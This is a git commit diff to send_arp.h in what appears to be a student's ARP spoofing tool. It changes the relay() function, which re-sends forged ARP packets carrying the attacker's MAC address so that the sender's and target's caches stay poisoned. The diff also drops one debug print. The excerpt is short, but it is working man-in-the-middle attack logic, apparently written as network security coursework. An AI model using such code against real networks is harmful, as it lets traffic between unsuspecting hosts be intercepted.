a692ddb28550af584316eb26133604fd4b6af9fb
kkm213 <kkm213@korea.ac.kr>
2022-08-22 16:59:35 +0900

    upload

--- send_arp.h
+++ send_arp.h
@@ -115,7 +115,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
 
         for (int i = 0; i < count; i++)
         {
-            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].target_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].sender_ip)))
+            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].target_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].sender_ip, 4)))
             {
                 printf("where is sender?\n");
                 request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
@@ -125,7 +125,6 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
             if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].sender_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].target_ip)))
             {
                 printf("where is target?\n");
-                print_mac(attacker_mac);
                 request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
                 continue;
             }
